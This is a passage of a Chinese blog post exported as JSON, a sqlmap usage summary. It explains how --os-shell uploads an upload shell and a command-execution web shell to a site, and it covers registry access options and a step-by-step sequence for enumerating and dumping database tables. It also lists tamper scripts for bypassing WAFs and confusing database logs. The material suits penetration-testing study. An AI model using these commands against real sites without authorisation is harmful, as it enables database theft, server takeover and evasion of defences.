punctuation\">}</span>\n    <span class=\"token keyword\">echo</span><span class=\"token string\">\"&lt;pre>$w&lt;/pre>\"</span><span class=\"token punctuation\">;</span><span class=\"token delimiter\">?></span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这是一个用于命令执行的代码，命令执行后会将执行的结果输出。</p>\n<p>直接在网站访问这两个<code>shell</code>文件就可以看到了</p>\n<p>一个提供了一个上传文件的入口，一个提供了一个以<code>cmd</code>参数的命令执行窗口</p>\n<pre><code>成功后会在网站绝对路径下，生成两个文件，一个可以上传，一个可以执行命令。\n\ntmpugvzq.php是可以上传\ntmpbylqf.php是可以执行命令\n</code></pre>\n<p>【如果没看到，可以查看<code>wireshark</code>或者先<code>bp</code>抓包数据流并时刻开启监听】</p>\n<p><strong>这个时候sqlmap主要做了三件事情：</strong></p>\n<pre><code>1、进行目标的一个基础信息的探测。\n2、上传shell到目标web网站上。\n3、退出时删除shell。\n</code></pre>\n<h4 id=\"2-Database\"><a href=\"#2-Database\" class=\"headerlink\" title=\"2.Database\"></a>2.Database</h4><p>数据库支持外连，通过<code>Sqlmap</code>执行<code>--os-shell</code>获取<code>shell</code>。</p>\n<p>必要条件：</p>\n<pre><code>数据库支持外连\n\n数据库权限为SA权限\n</code></pre>\n<p><code>Mysql</code>和<code>sqlsever</code>两者的情况不同，详细建议看文章学习</p>\n<h3 id=\"Windows-注册表访问\"><a href=\"#Windows-注册表访问\" class=\"headerlink\" title=\"Windows 注册表访问\"></a>Windows 注册表访问</h3><p>这些选项可以被用来访问后端数据库管理系统Windows 注册表。</p>\n<pre><code>–reg-read 读一个Windows 注册表项值\n–reg-add 写一个Windows 注册表项值数据\n–reg-del 删除Windows 注册表键值\n–reg-key=REGKEY Windows 注册表键\n–reg-value=REGVAL Windows 注册表项值\n–reg-data=REGDATA Windows 注册表键值数据\n–reg-type=REGTYPE Windows 注册表项值类型\n</code></pre>\n<h3 id=\"General（一般）\"><a href=\"#General（一般）\" class=\"headerlink\" title=\"General（一般）\"></a>General（一般）</h3><p>这些选项可以用来设置一些一般的工作参数。</p>\n<pre><code>-t TRAFFICFILE 记录所有 HTTP 流量到一个文本文件中\n-s SESSIONFILE 保存和恢复检索会话文件的所有数据\n–flush-session 刷新当前目标的会话文件\n–fresh-queries 忽略在会话文件中存储的查询结果\n–eta 显示每个输出的预计到达时间\n–update 更新 SqlMap\n–save file 保存选项到 INI 配置文件\n–batch 从不询问用户输入，使用所有默认配置。\n</code></pre>\n<h3 id=\"Miscellaneous（杂项\"><a href=\"#Miscellaneous（杂项\" class=\"headerlink\" title=\"Miscellaneous（杂项\"></a>Miscellaneous（杂项</h3><pre><code>–beep 发现 SQL 注入时提醒\n–check-payload IDS 对注入 payloads 的检测测试\n–cleanup sqlmap.py 具体的 UDF 和表清理 DBMS\n–forms 对目标 URL 的解析和测试形式\n–gpage=GOOGLEPAGE 从指定的页码使用谷歌 dork 结果\n–page-rank Google dork 结果显示网页排名（PR）\n–parse-errors 从响应页面解析数据库管理系统的错误消息\n–replicate 复制转储的数据到一个 sqlite3 数据库\n–tor 使用默认的 Tor（Vidalia/ Privoxy/ Polipo）代理地址\n–wizard 给初级用户的简单向导界面\n</code></pre>\n<h3 id=\"制定测试的种类\"><a href=\"#制定测试的种类\" class=\"headerlink\" title=\"制定测试的种类\"></a>制定测试的种类</h3><pre><code>–technique=TECH SQL注入技术测试（默认 BEUST）\nTechniques（技巧）：\n–technique 测试指定注入类型使用的技术\n</code></pre>\n<p>不加参数默认测试所有注入技术:</p>\n<pre><code>B: 基于布尔的 SQL 盲注\nE: 基于显错 sql 注入\nU: 基于 UNION 注入\nS: 叠层 sql 注入\nT: 基于时间盲注\n</code></pre>\n<h3 id=\"sqlmap-判断waf\"><a href=\"#sqlmap-判断waf\" class=\"headerlink\" title=\"sqlmap 判断waf\"></a>sqlmap 判断waf</h3><pre><code>sqlmap -u &quot;http://www.test.com/&quot; --identify-waf --batch\n</code></pre>\n<h2 id=\"一般注入流程\"><a href=\"#一般注入流程\" class=\"headerlink\" title=\"一般注入流程\"></a>一般注入流程</h2><p>以mysql为例</p>\n<p>1.验证注入</p>\n<pre><code>sqlmap -u “注入点URL”\n</code></pre>\n<p>从中可以发现存在注入的类型，数据库类型和web应用程序PHP和Apache等版本信息。</p>\n<p>2.列举数据库名</p>\n<pre><code>sqlmap -u &quot;注入点&quot; --dbs\nsqlmap -u &quot;注入点&quot; --current-db  #列举当前使用的数据库\n</code></pre>\n<p>3.查询某一数据库的所有表名</p>\n<pre><code>sqlmap -u &quot;注入点&quot; -D 数据库名 --tables\n</code></pre>\n<p>4.列举这一数据库的表的所有列（字段）</p>\n<pre><code>sqlmap -u &quot;注入点&quot; -D 数据库名 -T 表名 --columns\n</code></pre>\n<p>5.暴字段内容</p>\n<pre><code>sqlmap -u &quot;注入点&quot; -D 数据库名 -T 表名 -C &quot;要爆的字段名&quot; --dump\n</code></pre>\n<p>爆一个字段的话可能会很慢或者出错，全部暴出最好。</p>\n<p>可以在后面加个 –batch 可以不用手动选择yes或no的选项。</p>\n<h3 id=\"sqlmap-tamper-的使用\"><a href=\"#sqlmap-tamper-的使用\" class=\"headerlink\" title=\"sqlmap tamper 的使用\"></a>sqlmap tamper 的使用</h3><p>可以进行各种绕过防火墙和waf</p>\n<pre><code>--tamper xxx.py  (.py可以不加)\n</code></pre>\n<p><code>eg:python sqlmap.py -u “” – tamper base64encode.py</code><br>1.普通的<code>tamper</code>搭配方式:</p>\n<pre><code>tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,\ncharencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,\nnonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,\nspace2randomblank,unionalltounion,unmagicquotes\n</code></pre>\n<p>2.数据库为<code>MSSQL</code>的搭配方式：</p>\n<pre><code>tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,\nnonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,\nspace2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,\nunmagicquotes\n</code></pre>\n<p>3.数据库为<code>Mysql</code>的搭配方式:</p>\n<pre><code>tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,\ngreatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,\nmultiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,\nspace2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,\nversionedkeywords,versionedmorekeywords,xforwardedfor\n</code></pre>\n<p>4.常用脚本用法：</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><code>apostrophemask.py UTF-8编码</code><br><code>apostrophenullencode.py unicode编码</code><br><code>appendnullbyte.py 添加%00</code><br><code>base64encode.py base64编码</code><br><code>between.py 以”not between”替换”&gt;“</code><br><code>bluecoat.py 以随机的空白字符替代空格，以”like”替代”=“</code><br><code>chardoubleencode.py 双重url编码</code><br><code>charencode.py url编码</code><br><code>charunicodeencode.py 对未进行url编码的字符进行unicode编码</code><br><code>equaltolike.py 以”like”替代”=“</code><br><code>halfversionedmorekeywords.py在每个关键字前添加条件注释</code><br><code>ifnull2ifisnull.py 以”IF(ISNULL(A), B, A)”替换”IFNULL(A, B)”</code><br><code>modsecurityversioned.py 条件注释</code><br><code>modsecurityzeroversioned.py 条件注释，0000</code><br><code>multiplespaces.py 添加多个空格</code><br><code>nonrecursivereplacement.py 可以绕过对关键字删除的防注入（这个我也不知道怎么说好，看例子。。。）</code><br><code>percentage.py 在每个字符前添加百分号（%）</code><br><code>randomcase.py 随即大小写</code><br><code>randomcomments.py 随机插入区块注释</code><br><code>sp_password.py 语句结尾添加”sp_password”迷惑数据库日志（很。。。）</code><br><code>space2comment.py 以区块注释替换空格</code><br><code>space2dash.py 以单行注释”–”和随机的新行替换空格</code><br><code>space2hash.py 以单行注释”#”和由随机字符组成的新行替换空格</code><br><code>space2morehash.py 没看出来和上面那个有什么区别。。</code><br><code>space2mssqlblank.py 以随机空白字符替换空格</code><br><code>space2mssqlhash.py 以单行注释”#”和新行替换空格</code><br><code>space2mysqlblank.py 以随机空白字符替换空格</code><br><code>space2mysqldash.py 以单行注释和新行替换空格</code><br><code>space2plus.py 以”+”替换空格</code><br><code>space2randomblank.py 随机空白字符替换空格</code><br><code>unionalltounion.py 以”union all”替换”union”</code><br><code>unmagicquotes.py 以”%bf%27”替换单引号，并在结尾添加注释”–”</code><br><code>versionedkeywords.py 对不是函数的关键字条件注释</code><br><code>versionedmorekeywords.py 对关键字条件注释</code></p></blockquote>\n","text":" 原文作者: Ywc 原文链接: https://yinwc.github.io/2018/07/05/tooluse(sqlmap)/ 发表日期: July ...","permalink":"/post/tooluse(sqlmap)","photos":[],"count_time":{"symbolsCount":"11k","symbolsTime":"10 mins."},"categories":[{"name":"daily","slug":"daily","count":7,"path":"api/categories/daily.json"}],"tags":[{"name":"tools","slug":"tools","count":3,"path":"api/tags/tools.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#sqlmap%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">sqlmap使用总结</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%80%89%E9%A1%B9\"><span class=\"toc-text\">选项</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Target-%E7%9B%AE%E6%A0%87\"><span class=\"toc-text\">Target(目标)</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Request%EF%BC%88%E8%AF%B7%E6%B1%82%EF%BC%89\"><span class=\"toc-text\">Request（请求）</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Optimization%EF%BC%88%E4%BC%98%E5%8C%96%EF%BC%89\"><span class=\"toc-text\">Optimization（优化）</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Injection%EF%BC%88%E6%B3%A8%E5%85%A5%EF%BC%89\"><span class=\"toc-text\">Injection（注入）</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Detection%EF%BC%88%E6%A3%80%E6%B5%8B%EF%BC%89\"><span class=\"toc-text\">Detection（检测）</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Fingerprint%EF%BC%88%E6%8C%87%E7%BA%B9%EF%BC%89\"><span class=\"toc-text\">Fingerprint（指纹）</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Enumeration%EF%BC%88%E6%9E%9A%E4%B8%BE%EF%BC%89\"><span class=\"toc-text\">Enumeration（枚举）</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Brute-force-%E8%9B%AE%E5%8A%9B\"><span class=\"toc-text\">Brute force(蛮力)</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#User-defined-function-injection%EF%BC%88%E7%94%A8%E6%88%B7%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0%E6%B3%A8%E5%85%A5%EF%BC%89\"><span class=\"toc-text\">User-defined function injection（用户自定义函数注入）</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#File-system-access%EF%BC%88%E8%AE%BF%E9%97%AE%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%EF%BC%89\"><span class=\"toc-text\">File system access（访问文件系统）</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Operating-system-access%EF%BC%88%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%BF%E9%97%AE%EF%BC%89\"><span class=\"toc-text\">[*]Operating system access（操作系统访问）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#os-shell%E7%9A%84%E4%BD%BF%E7%94%A8\"><span class=\"toc-text\">-os-shell的使用</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">1.注入</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2-Database\"><span class=\"toc-text\">2.Database</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Windows-%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%AE%BF%E9%97%AE\"><span class=\"toc-text\">Windows 注册表访问</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#General%EF%BC%88%E4%B8%80%E8%88%AC%EF%BC%89\"><span class=\"toc-text\">General（一般）</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Miscellaneous%EF%BC%88%E6%9D%82%E9%A1%B9\"><span class=\"toc-text\">Miscellaneous（杂项</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%B6%E5%AE%9A%E6%B5%8B%E8%AF%95%E7%9A%84%E7%A7%8D%E7%B1%BB\"><span class=\"toc-text\">制定测试的种类</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#sqlmap-%E5%88%A4%E6%96%ADwaf\"><span class=\"toc-text\">sqlmap 判断waf</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%80%E8%88%AC%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B\"><span class=\"toc-text\">一般注入流程</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#sqlmap-tamper-%E7%9A%84%E4%BD%BF%E7%94%A8\"><span class=\"toc-text\">sqlmap tamper 的使用</span></a></li></ol></li></ol></li></ol>","author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"htbのMachines","uid":"4497d51e9ba49087760c38d70069b58c","slug":"htb(Machines)","date":"2023-02-13T14:10:53.464Z","updated":"2023-11-01T13:33:59.921Z","comments":true,"path":"api/articles/htb(Machines).json","keywords":null,"cover":"/img/10.jpg","text":"Machines Machines【WEB】Analytics[easy]知识点 ","permalink":"/post/htb(Machines)","photos":[],"count_time":{"symbolsCount":44,"symbolsTime":"1 mins."},"categories":[{"name":"Hack the Box","slug":"Hack-the-Box","count":2,"path":"api/categories/Hack-the-Box.json"}],"tags":[{"name":"htb","slug":"htb","count":2,"path":"api/tags/htb.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"反弹shell","uid":"9b02ce479705b9f09b692586eea96671","slug":"Reverses-shell","date":"2023-02-13T13:56:59.573Z","updated":"2023-08-06T08:00:32.766Z","comments":true,"path":"api/articles/Reverses-shell.json","keywords":null,"cover":"/img/24.jpg","text":"监听，弹弹弹 反弹shell姿势netcat 一句话反弹获取shell（想反弹谁的shell就在谁的后面加-e /bin/sh或-e /bin/bash） 正向...","permalink":"/post/Reverses-shell","photos":[],"count_time":{"symbolsCount":"1.1k","symbolsTime":"1 mins."},"categories":[{"name":"daily","slug":"daily","count":7,"path":"api/categories/daily.json"}],"tags":[{"name":"提权","slug":"提权","count":2,"path":"api/tags/提权.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}